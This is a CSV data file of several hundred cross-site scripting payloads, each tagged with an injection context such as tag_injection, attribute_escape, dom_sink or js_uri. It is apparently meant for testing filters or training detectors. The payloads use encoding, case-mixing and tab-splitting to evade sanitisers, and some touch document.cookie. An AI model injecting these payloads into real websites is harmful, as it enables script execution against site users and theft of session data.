payload,context
<img on&#101;rror=consol&#101;.log(loc&#97;tion.h&#97;sh)/>,tag_injection
%22><img onend=confirm(%27XSS%27)>,tag_injection
""" onlo&#97;d=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83)) """,attribute_escape
""" oNanImaTioNitEraTioN=cOnsOle.loG(dOcuMenT.cOokIe) """,attribute_escape
' onanimationend=prompt(1) ',attribute_escape
"SetTimEouT(""ProMpt(1)"",0)",dom_sink
"<script>alert`String.fromCharCode(88,83,83)`</script>",script_injection
' onanimationend=console.log(location.hash) ',attribute_escape
<scRipT>aLerT`lOcaTioN.hAsh`</ScrIpt>,script_injection
%3Cimg onanimationiteration=confirm(document.cookie)%3E,tag_injection
' on&#101;rror=consol&#101;.log(docum&#101;nt.cooki&#101;) ',attribute_escape
<img on&#97;nim&#97;tionst&#97;rt=prompt(docum&#101;nt.cooki&#101;)/>,tag_injection
"""%3E%3Cimg onerror=console.log('XSS')%3E",tag_injection
' onload=prompt('XSS') ',attribute_escape
<imG oNrePeaT=cOnsOle.loG('XSS')/>,tag_injection
' oNanImaTioNenD=pRomPt(DocUmeNt.DomAin) ',attribute_escape
""" onfocus=consol&#101;.log(docum&#101;nt.cooki&#101;) &#97;utofocus=""",attribute_escape
"eval(%22console.log(String.fromCharCode(88,83,83))%22)",dom_sink
""" onanimationend=confirm(document.domain) """,attribute_escape
%3Cimg onanimationend=alert(document.cookie)/%3E,tag_injection
<script>/x/prompt(%27XSS%27)</script>,script_injection
<img onr&#101;p&#101;&#97;t=consol&#101;.log(1)/>,tag_injection
<img on&#97;nim&#97;tion&#101;nd=confirm(docum&#101;nt.cooki&#101;)/>,tag_injection
J&#97;VasCriPt:ProMpt(doCumEnt.coOkiE),js_uri
"""%3E%3Cimg onanimationcancel=alert(location.hash)%3E",tag_injection
<img onanimationiteration=\u0061lert(document.domain)/>,tag_injection
%3Cimg onanimationend=confirm(1)%3E,tag_injection
%3Cscript%3E/x/prompt(document.cookie)%3C/script%3E,script_injection
<scr	ipt>/x/console.log(1)</scr	ipt>,script_injection
"""><Img onAniMatIonStaRt=ProMpt(doCumEnt.coOkiE)>",tag_injection
<imG oNanImaTioNenD=aLerT(dOcuMenT.dOmaIn)>,tag_injection
javascript:void(\u0061lert(document.cookie)),js_uri
<scRipT>cOnsOle.loG`'XSS'`</scRipT>,script_injection
%27 onerror=console.log(document.domain) %27,attribute_escape
"""><img onr&#101;p&#101;&#97;t=&#97;l&#101;rt(docum&#101;nt.cooki&#101;)>",tag_injection
%27 onrepeat=confirm(document.cookie) %27,attribute_escape
"""><img onlo&#97;d=prompt(1)>",tag_injection
%3Cimg onbegin=confirm('XSS')/%3E,tag_injection
"""><Img onLoaD=cOnfIrm(1)>",tag_injection
<script>/*/confirm(document.domain)</script>,script_injection
<img onrepeat=prompt('XSS')>,tag_injection
<img on&#101;rror=confirm(docum&#101;nt.cooki&#101;)/>,tag_injection
location.href=%22javascript:console.log(document.domain)%22,dom_sink
%3Cscript%3E//alert(document.domain)%3C/script%3E,script_injection
' onlo&#97;d=&#97;l&#101;rt(1) ',attribute_escape
""" onanimationstart=alert('XSS') """,attribute_escape
' oNrePeaT=cOnfIrm('XSS') ',attribute_escape
"""><img on&#101;rror=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>",tag_injection
<img onanimationiteration=alert(1)>,tag_injection
j&#97;vascript:console.log('XSS'),js_uri
"""><img onr&#101;p&#101;&#97;t=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
"""><img onlo&#97;d=confirm(docum&#101;nt.dom&#97;in)>",tag_injection
""" oNanImaTioNitEraTioN=pRomPt(LocAtiOn.HasH) """,attribute_escape
"loc&#97;tion.hr&#101;f=""j&#97;v&#97;script:confirm(docum&#101;nt.dom&#97;in)""",dom_sink
"SetTimEouT(""ConFirM(dOcuMenT.cOokIe)"",0)",dom_sink
%3Cimg onerror=console.log(document.cookie)/%3E,tag_injection
<scr	ipt>//console.log(document.cookie)</scr	ipt>,script_injection
""" oNenD=cOnsOle.loG(1) """,attribute_escape
<imG oNrePeaT=pRomPt('XSS')>,tag_injection
""" oNanImaTioNstArt=coNfiRm(1) """,attribute_escape
%3Cimg onrepeat=prompt(document.domain)%3E,tag_injection
"&#101;v&#97;l(""confirm(loc&#97;tion.h&#97;sh)"")",dom_sink
%22 onerror=prompt(1) %22,attribute_escape
"""><img onlo&#97;d=consol&#101;.log(docum&#101;nt.cooki&#101;)>",tag_injection
<img onanimationiteration=confirm(document.cookie)>,tag_injection
<img onbegin=\u0061lert(location.hash)/>,tag_injection
%22><img onrepeat=confirm(document.cookie)>,tag_injection
' oNerRor=alErt(doCumEnt.doMaiN) ',attribute_escape
%3Cimg onerror=prompt(document.cookie)%3E,tag_injection
"%27 onrepeat=alert(String.fromCharCode(88,83,83)) %27",attribute_escape
"loc&#97;tion.hr&#101;f=""j&#97;v&#97;script:confirm(1)""",dom_sink
<img onload=alert('XSS')>,tag_injection
"""><img onanimationcancel=alert(1)>",tag_injection
"""%3E%3Cimg onerror=alert(1)%3E",tag_injection
<imG oNloAd=ConSolE.lOg(DocUmeNt.CooKie)>,tag_injection
"""%3E%3Cimg onerror=alert('XSS')%3E",tag_injection
""" onanimationiteration=confirm(1) """,attribute_escape
<img on&#101;rror=consol&#101;.log(loc&#97;tion.h&#97;sh)>,tag_injection
"""><img onb&#101;gin=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)>",tag_injection
"""><img onend=console.log('XSS')>",tag_injection
' oNerRor=coNsoLe.Log(doCumEnt.coOkiE) ',attribute_escape
"<img on&#97;nim&#97;tion&#101;nd=prompt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
document.write(%22<img src=x onerror=prompt(%27XSS%27)>%22),dom_sink
%22 onanimationstart=alert(%27XSS%27) %22,attribute_escape
"""%3E%3Cimg onanimationend=prompt(location.hash)%3E",tag_injection
"<img on&#97;nim&#97;tionst&#97;rt=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
<imG oNloAd=ConFirM(1)/>,tag_injection
""" on&#101;rror=consol&#101;.log(1) """,attribute_escape
""" oNerRor=coNsoLe.Log(StRinG.fRomChaRCoDe(88,83,83)) """,attribute_escape
<imG oNanImaTioNstArt=coNsoLe.Log(doCumEnt.coOkiE)/>,tag_injection
' oNerRor=prOmpT(dOcuMenT.dOmaIn) ',attribute_escape
<img onend=confirm(document.cookie)>,tag_injection
<imG oNbeGin=alErt(loCatIon.haSh)/>,tag_injection
<img onr&#101;p&#101;&#97;t=consol&#101;.log(loc&#97;tion.h&#97;sh)/>,tag_injection
' onload=console.log(document.cookie) ',attribute_escape
%22 onerror=confirm(location.hash) %22,attribute_escape
<scr	ipt>/x/confirm(document.cookie)</scr	ipt>,script_injection
j&#97;vascr	ipt:alert(1),js_uri
%22 onanimationiteration=console.log(1) %22,attribute_escape
"location.href=""javascript:prompt(1)""",dom_sink
<imG oNloAd=ConSolE.lOg(DocUmeNt.DomAin)>,tag_injection
%27 onanimationcancel=alert(location.hash) %27,attribute_escape
<img onanimationiteration=alert(document.cookie)>,tag_injection
%3Cimg onrepeat=alert(1)%3E,tag_injection
<img onbegin=confirm(document.domain)>,tag_injection
""" on&#101;rror=confirm('XSS') """,attribute_escape
<img on&#97;nim&#97;tionit&#101;r&#97;tion=confirm(loc&#97;tion.h&#97;sh)/>,tag_injection
%3Cscript%3E/x/console.log('XSS')%3C/script%3E,script_injection
"""><img onlo&#97;d=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
"""><img onr&#101;p&#101;&#97;t=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
"""><img on&#97;nim&#97;tionit&#101;r&#97;tion=confirm(1)>",tag_injection
' oNerRor=prOmpT('XSS') ',attribute_escape
"""><img on&#101;nd=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection
<img onrepeat=prompt(document.domain)/>,tag_injection
<img onb&#101;gin=prompt(docum&#101;nt.dom&#97;in)>,tag_injection
<img onbegin=prompt('XSS')/>,tag_injection
"""%3E%3Cimg onanimationiteration=alert(document.domain)%3E",tag_injection
%3Cimg onanimationend=console.log(document.domain)%3E,tag_injection
"J&#97;VasCriPt:ConSolE.lOg(StrIng.frOmCHarCodE(88,83,83))",js_uri
<scr	ipt>prompt(1)</scr	ipt>,script_injection
<img onr&#101;p&#101;&#97;t=consol&#101;.log(docum&#101;nt.cooki&#101;)>,tag_injection
""" oNanImaTioNitEraTioN=cOnsOle.loG(STriNg.FroMChArCOde(88,83,83)) """,attribute_escape
%27 onerror=confirm(location.hash) %27,attribute_escape
"docum&#101;nt.body.inn&#101;rHTML=""<img src=x on&#101;rror=confirm(loc&#97;tion.h&#97;sh)>""",dom_sink
<img onbegin=prompt(document.cookie)/>,tag_injection
"""><img onerror=\u0061lert(document.domain)>",tag_injection
<scRipT>/*/pRomPt('XSS')</sCriPt>,script_injection
"""><Img onRepEat=coNfiRm(1)>",tag_injection
eval(%22confirm(location.hash)%22),dom_sink
""" on&#97;nim&#97;tionit&#101;r&#97;tion=confirm(docum&#101;nt.dom&#97;in) """,attribute_escape
%3Cimg onerror=alert(1)%3E,tag_injection
"<imG oNanImaTioNstArt=coNfiRm(StrIng.frOmCHarCodE(88,83,83))/>",tag_injection
"""><img on&#101;rror=confirm(docum&#101;nt.cooki&#101;)>",tag_injection
%3Cimg onend=alert('XSS')%3E,tag_injection
""" on&#97;nim&#97;tion&#101;nd=confirm(docum&#101;nt.dom&#97;in) """,attribute_escape
"document.write(""%3Cimg src=x onerror=prompt(document.domain)%3E"")",dom_sink
"""><Img onBegIn=ConFirM(lOcaTioN.hAsh)>",tag_injection
<img on&#101;nd=prompt(docum&#101;nt.dom&#97;in)/>,tag_injection
%22><img onanimationiteration=alert(location.hash)>,tag_injection
<img onerror=\u0061lert('XSS')>,tag_injection
"""><img on&#97;nim&#97;tion&#101;nd=prompt(loc&#97;tion.h&#97;sh)>",tag_injection
""" oNanImaTioNitEraTioN=pRomPt(StrIng.frOmCHarCodE(88,83,83)) """,attribute_escape
<img onanimationstart=prompt(1)>,tag_injection
"<scRipT>cOnsOle.loG`STriNg.FroMChArCOde(88,83,83)`</scRipT>",script_injection
%3Cimg onrepeat=console.log(document.domain)%3E,tag_injection
"<img onanimationstart=prompt(String.fromCharCode(88,83,83))>",tag_injection
"%22 onload=prompt(String.fromCharCode(88,83,83)) %22",attribute_escape
<img onanimationend=prompt(%27XSS%27)>,tag_injection
""" onanimationiteration=alert('XSS') """,attribute_escape
<imG oNerRor=alErt(doCumEnt.coOkiE)/>,tag_injection
%3Cscript%3Econfirm`location.hash`%3C/script%3E,script_injection
J&#97;VasCriPt:AleRt(1),js_uri
%3Cscript%3E//alert('XSS')%3C/script%3E,script_injection
""" onr&#101;p&#101;&#97;t=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83)) """,attribute_escape
"""><img on&#97;nim&#97;tion&#101;nd=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)>",tag_injection
<imG oNanImaTioNstArt=alErt('XSS')>,tag_injection
<imG oNanImaTioNstArt=prOmpT('XSS')/>,tag_injection
"""><img onerror=alert(document.cookie)>",tag_injection
%3Cimg onanimationend=confirm(document.cookie)/%3E,tag_injection
"""><Img onLoaD=cOnfIrm(loCatIon.haSh)>",tag_injection
eval(%22console.log(1)%22),dom_sink
"setTimeout(%22alert(document.domain)%22,0)",dom_sink
"%3Cimg onload=prompt(String.fromCharCode(88,83,83))/%3E",tag_injection
javascript:void(prompt(document.domain)),js_uri
' oNanImaTioNitEraTioN=cOnfIrm(doCumEnt.coOkiE) ',attribute_escape
<imG oNanImaTioNenD=aLerT('XSS')>,tag_injection
' onanimationiteration=confirm(location.hash) ',attribute_escape
<scr	ipt>console.log`location.hash`</scr	ipt>,script_injection
"<img onbegin=confirm(String.fromCharCode(88,83,83))>",tag_injection
%22><img onanimationstart=confirm(document.domain)>,tag_injection
<img onanimationend=alert(1)>,tag_injection
""" onb&#101;gin=confirm(docum&#101;nt.dom&#97;in) """,attribute_escape
<img onrepeat=\u0061lert(document.cookie)/>,tag_injection
"""><img onbegin=confirm(document.cookie)>",tag_injection
<img onanimationend=confirm(1)>,tag_injection
' oNbeGin=alErt('XSS') ',attribute_escape
""" onfocus=prompt(String.fromCh&#97;rCod&#101;(88,83,83)) &#97;utofocus=""",attribute_escape
<imG oNenD=pRomPt(DocUmeNt.CooKie)/>,tag_injection
<img onanimationiteration=\u0061lert(document.cookie)>,tag_injection
<img onerror=\u0061lert(document.domain)>,tag_injection
"' oNanImaTioNenD=pRomPt(StrIng.frOmCHarCodE(88,83,83)) '",attribute_escape
<imG oNrePeaT=aLerT(lOcaTioN.hAsh)/>,tag_injection
javascript:void(console.log('XSS')),js_uri
%22 onrepeat=alert(1) %22,attribute_escape
<img onanimationiteration=alert(document.domain)>,tag_injection
"""><img on&#97;nim&#97;tionst&#97;rt=&#97;l&#101;rt(docum&#101;nt.cooki&#101;)>",tag_injection
"' onrepeat=prompt(String.fromCharCode(88,83,83)) '",attribute_escape
<imG oNenD=aLerT('XSS')/>,tag_injection
%3Cimg onbegin=alert(document.cookie)%3E,tag_injection
%22><img onanimationend=alert(location.hash)>,tag_injection
javascr	ipt:void(alert(document.cookie)),js_uri
<img onend=console.log(document.cookie)/>,tag_injection
document.body.innerHTML=%22<img src=x onerror=console.log(location.hash)>%22,dom_sink
"""><img on&#97;nim&#97;tion&#101;nd=prompt(docum&#101;nt.cooki&#101;)>",tag_injection
"' onr&#101;p&#101;&#97;t=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83)) '",attribute_escape
<script>consol&#101;.log`docum&#101;nt.dom&#97;in`</script>,script_injection
""" onbegin=alert(String.fromCharCode(88,83,83)) """,attribute_escape
%3Cimg onanimationend=prompt(document.domain)/%3E,tag_injection
' on&#101;nd=&#97;l&#101;rt(1) ',attribute_escape
"document.body.innerHTML=""<img src=x onerror=\u0061lert(1)>""",dom_sink
"' onrepeat=\u0061lert(String.fromCharCode(88,83,83)) '",attribute_escape
' on&#97;nim&#97;tionit&#101;r&#97;tion=consol&#101;.log('XSS') ',attribute_escape
"setTimeout(""confirm(document.domain)"",0)",dom_sink
"' onanimationend=prompt(String.fromCharCode(88,83,83)) '",attribute_escape
<img onbegin=alert(%27XSS%27)/>,tag_injection
<img on&#101;rror=consol&#101;.log(docum&#101;nt.cooki&#101;)/>,tag_injection
"""%3E%3Cimg onbegin=console.log(document.domain)%3E",tag_injection
"%22><img onrepeat=alert(String.fromCharCode(88,83,83))>",tag_injection
"""%3E%3Cimg onanimationiteration=confirm(document.cookie)%3E",tag_injection
<scr	ipt>alert`1`</scr	ipt>,script_injection
<img onanimationiteration=\u0061lert('XSS')/>,tag_injection
"""><Img onAniMatIonEnd=prOmpT(STriNg.FroMChArCOde(88,83,83))>",tag_injection
<img on&#97;nim&#97;tion&#101;nd=&#97;l&#101;rt(1)/>,tag_injection
"&#101;v&#97;l(""&#97;l&#101;rt('XSS')"")",dom_sink
""" onanimationstart=prompt(document.domain) """,attribute_escape
<imG oNanImaTioNitEraTioN=pRomPt(LocAtiOn.HasH)>,tag_injection
"""><img onerror=\u0061lert('XSS')>",tag_injection
"s&#101;tTim&#101;out(""consol&#101;.log('XSS')"",0)",dom_sink
"location.href=""javascr	ipt:prompt(String.fromCharCode(88,83,83))""",dom_sink
<img onr&#101;p&#101;&#97;t=prompt(docum&#101;nt.dom&#97;in)/>,tag_injection
""" onanimationiteration=\u0061lert(location.hash) """,attribute_escape
%3Cimg onend=alert(1)/%3E,tag_injection
<script>/*/confirm(document.cookie)</script>,script_injection
<imG oNloAd=ProMpt(loCatIon.haSh)/>,tag_injection
<img onrepeat=\u0061lert(location.hash)/>,tag_injection
"%3Cimg onend=console.log(String.fromCharCode(88,83,83))%3E",tag_injection
%22 onrepeat=confirm(document.domain) %22,attribute_escape
' onr&#101;p&#101;&#97;t=consol&#101;.log(loc&#97;tion.h&#97;sh) ',attribute_escape
%3Cimg onanimationiteration=confirm(document.domain)/%3E,tag_injection
<img onr&#101;p&#101;&#97;t=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>,tag_injection
' onanimationstart=console.log(document.domain) ',attribute_escape
' oNenD=cOnsOle.loG(1) ',attribute_escape
"<imG oNrePeaT=cOnsOle.loG(STriNg.FroMChArCOde(88,83,83))>",tag_injection
<imG oNloAd=ConFirM(lOcaTioN.hAsh)/>,tag_injection
"""><img onload=console.log(document.cookie)>",tag_injection
""" onload=confirm(1) """,attribute_escape
"s&#101;tTim&#101;out(""&#97;l&#101;rt(docum&#101;nt.cooki&#101;)"",0)",dom_sink
"document.write(""<img src=x onerror=alert(document.cookie)>"")",dom_sink
<script>/*/prompt(document.domain)</script>,script_injection
%3Cimg onend=confirm(location.hash)%3E,tag_injection
%3Cimg onload=prompt(1)/%3E,tag_injection
' oNanImaTioNstArt=coNfiRm(1) ',attribute_escape
"SetTimEouT(""ConFirM(STriNg.FroMChArCOde(88,83,83))"",0)",dom_sink
""" onanimationcancel=\u0061lert(document.domain) """,attribute_escape
%22><img onload=alert(location.hash)>,tag_injection
<script>//confirm(document.domain)</script>,script_injection
%3Cimg onanimationcancel=alert('XSS')/%3E,tag_injection
%22><img onanimationend=alert(document.domain)>,tag_injection
%3Cscript%3E//confirm(document.domain)%3C/script%3E,script_injection
<imG oNerRor=alErt(doCumEnt.doMaiN)>,tag_injection
%3Cscript%3Econsole.log`location.hash`%3C/script%3E,script_injection
"<img onlo&#97;d=prompt(String.fromCh&#97;rCod&#101;(88,83,83))/>",tag_injection
"EvaL(""ConFirM(dOcuMenT.dOmaIn)"")",dom_sink
"document.write(""<img src=x onerror=confirm(String.fromCharCode(88,83,83))>"")",dom_sink
<imG oNanImaTioNitEraTioN=aLerT(1)/>,tag_injection
"setTimeout(%22alert(location.hash)%22,0)",dom_sink
"<img onanimationiteration=alert(String.fromCharCode(88,83,83))>",tag_injection
""" oNloAd=AleRt(DocUmeNt.CooKie) """,attribute_escape
""" oNanImaTioNstArt=alErt('XSS') """,attribute_escape
' oNanImaTioNitEraTioN=aLerT(1) ',attribute_escape
<img onrepeat=\u0061lert('XSS')/>,tag_injection
<img on&#101;nd=prompt(docum&#101;nt.cooki&#101;)>,tag_injection
"""><img onerror=prompt(String.fromCharCode(88,83,83))>",tag_injection
%3Cimg onrepeat=alert(document.domain)/%3E,tag_injection
""" onfocus=\u0061lert('XSS') autofocus=""",attribute_escape
""" oNanImaTioNstArt=coNfiRm(DocUmeNt.DomAin) """,attribute_escape
"<img onanimationiteration=console.log(String.fromCharCode(88,83,83))>",tag_injection
%3Cscript%3Econfirm`1`%3C/script%3E,script_injection
%3Cscript%3E/*/confirm(document.domain)%3C/script%3E,script_injection
<scRipT>/*/aLerT(lOcaTioN.hAsh)</ScrIpt>,script_injection
"""%3E%3Cimg onbegin=confirm(String.fromCharCode(88,83,83))%3E",tag_injection
<imG oNanImaTioNitEraTioN=pRomPt(1)/>,tag_injection
"""><img onerror=\u0061lert(1)>",tag_injection
"""%3E%3Cimg onanimationend=console.log(document.domain)%3E",tag_injection
j&#97;v&#97;script:void(consol&#101;.log(docum&#101;nt.dom&#97;in)),js_uri
""" onfocus=console.log(document.cookie) autofocus=""",attribute_escape
%22><img onanimationcancel=alert(1)>,tag_injection
' onanimationend=prompt(document.domain) ',attribute_escape
<img on&#101;rror=confirm(1)>,tag_injection
"""%3E%3Cimg onanimationstart=confirm(1)%3E",tag_injection
<scRipT>/X/cOnsOle.loG(dOcuMenT.dOmaIn)</sCriPt>,script_injection
"""><img onlo&#97;d=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)>",tag_injection
%3Cimg onrepeat=prompt('XSS')/%3E,tag_injection
%3Cimg onerror=console.log(document.domain)/%3E,tag_injection
""" oNbeGin=coNfiRm(LocAtiOn.HasH) """,attribute_escape
' on&#101;rror=consol&#101;.log(1) ',attribute_escape
<img on&#101;nd=prompt(1)/>,tag_injection
' onlo&#97;d=confirm('XSS') ',attribute_escape
%22><img onanimationcancel=prompt(%27XSS%27)>,tag_injection
<imG oNerRor=coNsoLe.Log('XSS')/>,tag_injection
"""><img on&#97;nim&#97;tionit&#101;r&#97;tion=confirm('XSS')>",tag_injection
"' oNanImaTioNitEraTioN=cOnsOle.loG(STriNg.FroMChArCOde(88,83,83)) '",attribute_escape
"<img onbegin=console.log(String.fromCharCode(88,83,83))/>",tag_injection
<img onend=alert(1)>,tag_injection
""" oNanImaTioNitEraTioN=cOnsOle.loG('XSS') """,attribute_escape
%22 onbegin=prompt(document.domain) %22,attribute_escape
<img onanimationiteration=prompt(location.hash)/>,tag_injection
%22><img onanimationcancel=alert(location.hash)>,tag_injection
<imG oNanImaTioNstArt=coNfiRm(1)>,tag_injection
javascr	ipt:void(console.log(document.cookie)),js_uri
' onrepeat=console.log(location.hash) ',attribute_escape
<imG oNenD=pRomPt(DocUmeNt.CooKie)>,tag_injection
"SetTimEouT(""ConSolE.lOg(LocAtiOn.HasH)"",0)",dom_sink
"location.href=""javascript:alert('XSS')""",dom_sink
<script>/*/prompt(location.hash)</script>,script_injection
"<scRipT>/*/pRomPt(StrIng.frOmCHarCodE(88,83,83))</sCriPt>",script_injection
"""><Img onAniMatIonCanCel=alErt('XSS')>",tag_injection
<img onanimationend=console.log(document.domain)/>,tag_injection
